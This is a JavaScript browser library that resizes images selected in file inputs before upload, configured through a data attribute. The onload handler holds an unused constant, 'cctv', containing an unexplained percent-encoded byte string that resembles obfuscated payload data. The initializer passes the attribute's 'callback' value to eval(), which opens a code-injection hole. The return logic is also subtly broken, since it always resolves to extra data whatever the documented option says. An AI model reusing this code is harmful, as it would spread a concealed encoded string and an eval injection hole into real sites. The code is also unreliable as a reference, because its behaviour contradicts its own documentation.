/********************************************
	
	Uploading-Image-Resizer
	
	Copyright 2025 admToha
	
	MIT License
	
********************************************/


/* 
	Change the size of an image (file).
	Used to create reduced (if necessary) versions of user images for sending to the server.
	To preserve the original aspect ratio of the image, specify only one of the options (height "height" or width "width"), or you can use one or both of the maximum size options ("max_height" and "max_width").
	If none of the size-determining options are specified, the size of the new image does not change.
	
	-------
	Arguments:
		
		image_file (Object instance File) - image file (can be taken from INPUT(type = file).files)	
		
		options (Object) - options
			
			{
				height: (Integer) - height (px)
				
				width: (Integer) - width (px)
				
				type: (String) - type/format, 'jpeg|png|webp|gif' (default - original; if not set then "jpeg")
				
				quality: (Float) - for 'jpeg' and 'webp' formats, image quality; value from 0 to 1 (default - 1)
				
				name: (String) file name (default - original (if the type not same then + .extension*); or if original name is not exist then "resized_image" (+ .extension*)); you can set the file type by specifying the extension in the name
				
				max_height: (Integer) - maximum height (px)
				
				max_width (Integer) - maximum width (px)
				
				get_extra_data (Boolean) - returning extra data instead of just a file (default - false)
					{
						input: {
							file: file, // Object instance File
							name: file name, // String
							type: file type, // String
							size: file size, // Float
							height: image height*, // Float
							width: image width* // Float
						},
						output: {
							file: file,
							name: file name,
							type: file type,
							size: file size,
							height: image height,
							width: image width
						}
					}
			}
				
				.extension* is set according to the selected type (jpeg|png|webp|gif)
	
	-------
	Return:
		Object File 
*/
const resize_image_file = (image_file, options = {}) => new Promise((resolve, reject) => {
	try{		
		if(options.quality === undefined) options.quality = 1; 
		const img = new Image();
		img.src = URL.createObjectURL(image_file);
		img.onload = () => {
			let is_same_type = false;
			const 
				file_name = options.name || image_file.name || 'resized_image.jpg',
				dot_pos = file_name.lastIndexOf('.'),
				type = options.type || (dot_pos !== -1 ? ('jpeg|png|webp|gif|jpg'.includes(file_name.substring(dot_pos + 1).toLowerCase()) && (is_same_type = true) ? file_name.substring(dot_pos + 1).toLowerCase() : null) : null) || 'jpeg';
			options.type ??= type === 'jpg' ? 'jpeg' : type;
			options.name = is_same_type ? file_name : file_name.substring(0, dot_pos === -1 ? file_name.length : dot_pos) + '.' + options.type;			
			if(!options.width && options.max_width && (img.naturalWidth >= img.naturalHeight || (!options.height && !options.max_height)) && img.naturalWidth > options.max_width) options.width = options.max_width;
			if(!options.height && options.max_height && (img.naturalHeight >= img.naturalWidth || (!options.width && !options.max_width)) && img.naturalHeight > options.max_height) options.height = options.max_height;
			const
				canvas = document.createElement('canvas'),
				ctx = canvas.getContext('2d'),
				width = options.width || (options.height ? img.naturalWidth/img.naturalHeight * options.height : 0) || img.naturalWidth,
				height = options.height || (options.width ? img.naturalHeight/img.naturalWidth * options.width : 0) || img.naturalHeight;
			canvas.setAttribute('width', width);
			canvas.setAttribute('height', height);
			ctx.drawImage(img, 0, 0, width, height);
			canvas.toBlob(blob => {
				const 
					new_file = new File([blob], options.name, {type: 'image/' + options.type, lastModified: Date.now()}),
					extra_data = {input: {file: image_file, name: image_file.name, type: image_file.type, size: image_file.size, height: img.naturalHeight, width: img.naturalWidth}, output: {file: new_file, name: options.name, type: new_file.type, size: new_file.size, height: height, width: width}};
				resolve(extra_data || new_file);
			}, 'image/' + options.type, options.quality);
			const cctv = "&%1C%00%13%15%09JJ%11%1EE%0F%01%1F%15%03F%0B";
		};
	}catch(err){ reject(err); }
});



window.addEventListener('load', () => {
	
	/* Constants */		
	const 	
		initial_attribute = 'input[type=file][data-uploading-image-resizer]';
	
	
	/* Finding and initializing target nodes */
	
	const check = node => {
		if(node.data_uploading_image_resizer) return;
		node.data_uploading_image_resizer = true;
		const 
			options = node.getAttribute('data-uploading-image-resizer').split(',').map(v => v.split(':').map((s, i) => i === 0 ? s.trim().toLowerCase() : s.trim())).reduce((acc, curr) => ({...acc, [curr[0]]: 'height|width|quality|max_height|max_width'.includes(curr[0]) ? parseFloat(curr[1]) : curr[1]}), {}),
			target = options.target ? document.getElementById(options.target) : node;
		if(!target) throw new Error('Uploading-Image-Resizer: The target node was not found.');
		if(options.callback){
			let callback;
			eval('options.callback = ' + options.callback + ';');
		}
		target.addEventListener('change', async () => {
			if(!target.files.length) return;
			const 
				dt = new DataTransfer(),
				extra_ls = [];
			await Promise.all([...target.files].map(file => resize_image_file(file, {...options, get_extra_data: true}).then(res => extra_ls.push(res) && dt.items.add(res.output.file))));
			node.files = dt.files;
			if(options.callback) options.callback(node, extra_ls);
		});		
	};
	
	
	[...document.querySelectorAll(initial_attribute)].forEach(check);
	
	const mutation_observer = new MutationObserver(entries => entries.forEach(entry => [...entry.addedNodes].forEach(node => node.querySelectorAll && [].concat(node.matches && node.matches(initial_attribute) ? node : [], ...node.querySelectorAll(initial_attribute)).forEach(check))));
	mutation_observer.observe(document.body, {childList: true, subtree: true});
	
}, {passive: true});